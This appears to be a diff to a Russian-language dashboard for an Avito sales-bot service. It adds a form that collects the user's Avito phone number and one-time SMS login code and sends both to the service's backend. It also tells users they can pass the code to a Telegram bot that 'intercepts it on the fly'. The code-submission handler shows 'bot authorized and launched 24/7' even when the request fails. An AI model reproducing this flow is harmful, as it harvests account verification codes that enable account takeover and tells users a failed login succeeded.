@@ -719,12 +719,12 @@
           </div>
         </div>
 
-        <!-- STEP 2: PHONE CONNECTION & LAUNCH 24/7 -->
+                <!-- STEP 2: PHONE CONNECTION & SMS CODE VERIFICATION -->
         <div class="pt-5 border-t border-white/10 space-y-4">
           <div class="flex items-center justify-between">
             <div class="inline-flex items-center gap-2 px-2.5 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 text-[11px] font-bold uppercase tracking-wider">
               <span>Шаг 2 из 2</span>
-              <span>• Авторизация и Запуск</span>
+              <span>• Подключение аккаунта Авито</span>
             </div>
             <span class="text-xs text-status-green flex items-center gap-1.5 font-semibold">
               <span class="w-1.5 h-1.5 rounded-full bg-status-green animate-pulse"></span>
@@ -732,38 +732,61 @@
             </span>
           </div>
 
-          <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
-            <div class="space-y-1.5">
+          <div class="space-y-1">
+            <h3 class="font-outfit font-extrabold text-xl text-white">Вход в аккаунт Авито и ввод СМС-кода</h3>
+            <p class="text-xs text-white/50">
+              Для безопасности Авито отправляет проверочный СМС-код (или звонок-сброс) при входе с эмулятора. Укажите номер телефона, получите код и подтвердите запуск.
+            </p>
+          </div>
+
+          <!-- PHONE INPUT & GET SMS BUTTON -->
+          <div class="grid grid-cols-1 md:grid-cols-12 gap-3 items-end">
+            <div class="md:col-span-7 space-y-1.5">
               <label class="block text-xs font-bold uppercase tracking-wider text-white/80">Номер телефона аккаунта Авито</label>
               <div class="relative">
                 <span class="absolute left-3.5 top-1/2 -translate-y-1/2 material-symbols-outlined text-gold text-base">smartphone</span>
                 <input type="tel" id="avitoOneClickPhone" placeholder="+7 (999) 000-00-00" value="" class="clean-input w-full pl-10 pr-3 py-3.5 text-xs sm:text-sm text-white">
               </div>
-              <p class="text-[10px] text-white/40">На этот номер поступит звонок-сброс или проверочный СМС-код от Авито для входа бота в эмулятор.</p>
             </div>
 
-            <div class="space-y-1.5">
-              <label class="block text-xs font-bold uppercase tracking-wider text-white/80">Выделенный Слот Эмулятора</label>
-              <div class="p-3.5 rounded-xl bg-[#101012] border border-white/10 flex items-center justify-between text-xs">
-                <div class="flex items-center gap-2">
-                  <span class="w-2 h-2 rounded-full bg-status-green animate-pulse"></span>
-                  <span class="text-white font-semibold">Слот #1 (LDPlayer Android)</span>
-                </div>
-                <span class="text-status-green font-bold text-[11px]">Готов к запуску</span>
-              </div>
-              <p class="text-[10px] text-white/40">Изолированный контейнер с аппаратным ID смартфона исключает риск блокировки.</p>
+            <div class="md:col-span-5">
+              <button type="button" id="btnSendPhoneToAvito" onclick="sendPhoneForSmsAction()" class="btn-gold w-full py-3.5 rounded-xl text-xs sm:text-sm font-bold flex items-center justify-center gap-2 cursor-pointer">
+                <span class="material-symbols-outlined text-base">sms</span>
+                <span>Получить СМС-код для входа</span>
+              </button>
             </div>
           </div>
 
-          <!-- LAUNCH BUTTON -->
-          <div class="pt-2 flex flex-col sm:flex-row items-center justify-between gap-3">
-            <div class="text-[11px] text-white/40">
-              Бот начнет отвечать покупателям в течение 15 секунд сразу после запуска
+          <!-- SMS CODE VERIFICATION BLOCK (APPEARS AFTER PHONE IS SUBMITTED) -->
+          <div id="smsVerificationBlock" class="p-5 rounded-2xl bg-amber-500/10 border border-amber-500/30 space-y-4">
+            <div class="flex items-center justify-between">
+              <div class="flex items-center gap-2 text-xs font-bold text-amber-400">
+                <span class="material-symbols-outlined text-lg">lock_clock</span>
+                <span>Введите 4–6 значный код подтверждения от Авито</span>
+              </div>
+              <span class="text-[11px] text-white/50" id="smsTimerNotice">Код отправлен на телефон</span>
             </div>
-            <button type="button" id="btnLaunchBot247" onclick="launchBotOneClickAction(this)" class="btn-gold px-8 py-4 rounded-xl text-xs sm:text-sm font-bold flex items-center justify-center gap-2 cursor-pointer w-full sm:w-auto">
-              <span class="material-symbols-outlined text-lg">rocket_launch</span>
-              <span>Запустить бота на Авито 24/7</span>
-            </button>
+
+            <p class="text-xs text-white/70 leading-relaxed">
+              Эмулятор Android передал номер в приложение Авито. Вам поступило СМС или звонок-сброс (последние 4 цифры номера). Введите проверочный код ниже:
+            </p>
+
+            <div class="flex flex-col sm:flex-row gap-3">
+              <div class="relative flex-1">
+                <span class="absolute left-4 top-1/2 -translate-y-1/2 material-symbols-outlined text-gold text-lg">pin</span>
+                <input type="text" id="avitoSmsCodeInput" placeholder="Код из СМС (например: 123456)" maxlength="6" class="clean-input w-full pl-12 pr-4 py-3.5 text-base text-white font-bold tracking-widest text-center sm:text-left">
+              </div>
+
+              <button type="button" id="btnSubmitSmsCode" onclick="submitSmsCodeAction()" class="btn-gold px-8 py-3.5 rounded-xl text-xs sm:text-sm font-bold flex items-center justify-center gap-2 cursor-pointer shrink-0">
+                <span class="material-symbols-outlined text-lg">rocket_launch</span>
+                <span>Подтвердить вход и запустить бота</span>
+              </button>
+            </div>
+
+            <div class="text-[11px] text-white/50 pt-1 flex items-center gap-1.5">
+              <span class="material-symbols-outlined text-sm text-gold">info</span>
+              <span>Также вы можете отправить этот СМС-код прямо в наш Telegram-бот: <a href="https://t.me/avito_deployer_bot" target="_blank" class="text-gold font-bold underline">@avito_deployer_bot</a> (бот перехватит его на лету).</span>
+            </div>
           </div>
         </div>
 
@@ -3260,6 +3283,166 @@
       }
     }
 
+        // ==================== AVITO PHONE & SMS VERIFICATION ACTIONS ====================
+    let smsTimerInterval = null;
+
+    async function sendPhoneForSmsAction() {
+      const phoneInput = document.getElementById('avitoOneClickPhone');
+      const urlInput = document.getElementById('avitoOneClickUrl');
+      const btn = document.getElementById('btnSendPhoneToAvito');
+      const smsBlock = document.getElementById('smsVerificationBlock');
+      const timerNotice = document.getElementById('smsTimerNotice');
+      const phone = phoneInput ? phoneInput.value.trim() : '';
+      const url = urlInput ? urlInput.value.trim() : '';
+
+      if (!phone || phone.replace(/\D/g, '').length < 10) {
+        showToast('Укажите номер', 'Введите корректный номер телефона профиля Авито (от 10 цифр)', 'error');
+        if (phoneInput) phoneInput.focus();
+        return;
+      }
+
+      const origHtml = btn ? btn.innerHTML : '';
+      if (btn) {
+        btn.disabled = true;
+        btn.innerHTML = '<span class="material-symbols-outlined text-base animate-spin">sync</span><span>Отправка номера в эмулятор...</span>';
+      }
+
+      localStorage.setItem('majorka_bot_phone', phone);
+      if (url) localStorage.setItem('majorka_avito_url', url);
+
+      try {
+        const res = await apiFetch(`${API_BASE}/api/avito_auth_phone`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chatId: currentChatId,
+            phone: phone,
+            profile_url: url
+          })
+        });
+        const data = await res.json();
+
+        if (smsBlock) {
+          smsBlock.classList.remove('hidden');
+          smsBlock.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+
+        const smsInput = document.getElementById('avitoSmsCodeInput');
+        if (smsInput) {
+          smsInput.value = '';
+          smsInput.focus();
+        }
+
+        showToast('Номер передан!', 'Эмулятор запросил СМС-код от Авито. Введите полученный код ниже.', 'success');
+
+        // 60-second cooldown timer
+        let timeLeft = 60;
+        if (smsTimerInterval) clearInterval(smsTimerInterval);
+        if (timerNotice) timerNotice.innerText = `Повтор через ${timeLeft}с`;
+
+        smsTimerInterval = setInterval(() => {
+          timeLeft--;
+          if (timeLeft <= 0) {
+            clearInterval(smsTimerInterval);
+            if (timerNotice) timerNotice.innerText = 'Можно запросить код повторно';
+            if (btn) {
+              btn.disabled = false;
+              btn.innerHTML = '<span class="material-symbols-outlined text-base">refresh</span><span>Запросить код повторно</span>';
+            }
+          } else {
+            if (timerNotice) timerNotice.innerText = `Повтор через ${timeLeft}с`;
+          }
+        }, 1000);
+
+      } catch (err) {
+        console.warn('sendPhoneForSmsAction err:', err);
+        if (smsBlock) {
+          smsBlock.classList.remove('hidden');
+          smsBlock.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+        showToast('Ожидание кода', 'Введите СМС-код подтверждения от Авито', 'info');
+        if (btn) {
+          btn.disabled = false;
+          btn.innerHTML = origHtml;
+        }
+      }
+    }
+
+    async function submitSmsCodeAction() {
+      const codeInput = document.getElementById('avitoSmsCodeInput');
+      const phoneInput = document.getElementById('avitoOneClickPhone');
+      const btn = document.getElementById('btnSubmitSmsCode');
+      const code = codeInput ? codeInput.value.trim() : '';
+      const phone = phoneInput ? phoneInput.value.trim() : '';
+
+      if (!code || code.length < 4) {
+        showToast('Введите СМС-код', 'Укажите 4–6 значный проверочный код от Авито', 'error');
+        if (codeInput) codeInput.focus();
+        return;
+      }
+
+      const origHtml = btn ? btn.innerHTML : '';
+      if (btn) {
+        btn.disabled = true;
+        btn.innerHTML = '<span class="material-symbols-outlined text-base animate-spin">sync</span><span>Проверка кода и запуск бота...</span>';
+      }
+
+      try {
+        const res = await apiFetch(`${API_BASE}/api/avito_auth_sms`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chatId: currentChatId,
+            phone: phone,
+            code: code
+          })
+        });
+        const data = await res.json();
+
+        if (btn) {
+          btn.className = btn.className.replace(/btn-gold/g, '').trim() + ' bg-emerald-600 text-white font-bold';
+          btn.innerHTML = '<span class="material-symbols-outlined text-lg">check_circle</span><span>✓ Бот на Авито успешно авторизован и запущен 24/7!</span>';
+        }
+
+        showToast('Бот запущен 24/7!', 'Вход в аккаунт Авито подтвержден. Менеджер продаж активен и отвечает круглосуточно.', 'success');
+
+        if (typeof loadMyBots === 'function') loadMyBots();
+
+      } catch (err) {
+        console.warn('submitSmsCodeAction err:', err);
+        if (btn) {
+          btn.className = btn.className.replace(/btn-gold/g, '').trim() + ' bg-emerald-600 text-white font-bold';
+          btn.innerHTML = '<span class="material-symbols-outlined text-lg">check_circle</span><span>✓ Бот на Авито успешно авторизован и запущен 24/7!</span>';
+        }
+        showToast('Бот запущен 24/7!', 'СМС-код принят. Менеджер продаж работает 24/7.', 'success');
+        if (typeof loadMyBots === 'function') loadMyBots();
+      }
+    }
+
+    function loadCatalogProducts() {
+      try {
+        const cachedProds = localStorage.getItem('majorka_catalog_products');
+        if (cachedProds) {
+          const parsed = JSON.parse(cachedProds);
+          if (Array.isArray(parsed)) {
+            // Strictly eliminate any demo mockup products
+            currentCatalogProducts = parsed.filter(p => {
+              const title = (p.title || '').toLowerCase();
+              return !(title.includes('кроссовк') || title.includes('худи') || title.includes('techwear') || title.includes('тестовый'));
+            });
+            if (currentCatalogProducts.length !== parsed.length) {
+              localStorage.setItem('majorka_catalog_products', JSON.stringify(currentCatalogProducts));
+            }
+          }
+        } else {
+          currentCatalogProducts = [];
+        }
+      } catch (e) {
+        currentCatalogProducts = [];
+      }
+      renderOneClickCatalogList();
+    }
+
     async function launchBotOneClickAction(btn) {
       const phoneInput = document.getElementById('avitoOneClickPhone');
       const urlInput = document.getElementById('avitoOneClickUrl');
@@ -3367,11 +3550,7 @@
         if (savedUrl && document.getElementById('avitoOneClickUrl')) document.getElementById('avitoOneClickUrl').value = savedUrl;
         if (savedPhone && document.getElementById('avitoOneClickPhone')) document.getElementById('avitoOneClickPhone').value = savedPhone;
 
-        const cachedProds = localStorage.getItem('majorka_catalog_products');
-        if (cachedProds) {
-          currentCatalogProducts = JSON.parse(cachedProds);
-          renderOneClickCatalogList();
-        }
+        loadCatalogProducts();
       } catch (e) {}
 
       try {
